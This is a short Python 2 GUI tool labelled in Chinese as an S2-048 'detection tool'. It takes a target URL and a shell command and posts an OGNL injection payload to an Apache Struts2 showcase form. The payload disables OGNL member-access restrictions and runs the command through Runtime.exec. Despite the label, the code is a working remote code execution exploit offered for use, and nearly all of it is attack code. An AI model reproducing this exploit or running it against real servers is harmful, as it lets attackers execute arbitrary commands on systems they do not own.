# coding:utf-8
import requests
from Tkinter import *
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers


class START:

    def __init__(self, root):
        self.root = root
        self.show_W_Text = Text()
        self.canvas1 = Canvas(root, width=60, height=20, bg='white')
        self.canvas1.create_text(30, 10, text='目标地址', fill='black')
        self.canvas2 = Canvas(root, width=60, height=20, bg='white')
        self.canvas2.create_text(30, 10, text='Dos命令', fill='black')
        self.edit_url = Entry(root, text="输入地址", width=50)
        self.edit_key = Entry(root, text="Dos命令", width=50)
        self.butt_whois = Button(root, text="执行", command=self.poc)
        self.canvas1.pack()
        self.edit_url.pack()
        self.canvas2.pack()
        self.edit_key.pack()
        self.butt_whois.pack()
        self.show_W_Text.pack()

    def poc(self):
        w_url = self.edit_url.get()
        w_key = self.edit_key.get()
        text = self.show_W_Text
        register_openers()
        datagen, header = multipart_encode({"image1": open("tmp.txt", "ab+")})
        header = {
            'Referer': 'http://127.0.0.1:8080/2.3.15.1-showcase/integration/editGangster'
        }
        payload = "%{"
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % w_key
        payload += "}"
        data = {
            "name": payload,
            "age": 20,
            "__checkbox_bustedBefore": "true",
            "description": 1
        }
        request = requests.post(w_url, data=data, headers=header)
        response = request.content
        try:
            response = response.decode('gbk')
        except:
            pass
        text.insert(1.0, response)
        print response


if __name__ == '__main__':

    ROOT = Tk()
    ROOT.title("S2-048检测工具  By:Tos")
    motion = START(ROOT)
    mainloop()

